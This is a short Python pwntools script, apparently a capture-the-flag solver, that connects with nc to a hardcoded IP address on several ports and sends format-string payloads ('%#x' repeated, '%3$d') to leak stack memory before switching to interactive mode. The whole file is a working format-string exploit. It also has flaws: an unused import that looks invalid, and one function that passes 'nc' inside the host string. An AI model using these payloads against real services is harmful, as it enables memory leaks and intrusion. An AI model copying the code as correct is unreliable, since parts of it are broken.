from aiohttp import payload_type
from pwn import *


def login1():
    p = process(['nc', '170.64.222.246', '6843'])

    payload = b'%#x ' * 16
    p.sendline(payload)
    p.interactive()

def login2():
    p = process(['nc', '170.64.222.246', '6844'])

    payload =  b'%3$d '
    p.sendline(payload)
    p.interactive()

def login3():
    p = process(['nc', 'nc 170.64.222.246', '6841'])
    payload = b'%#x ' * 10
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    login2()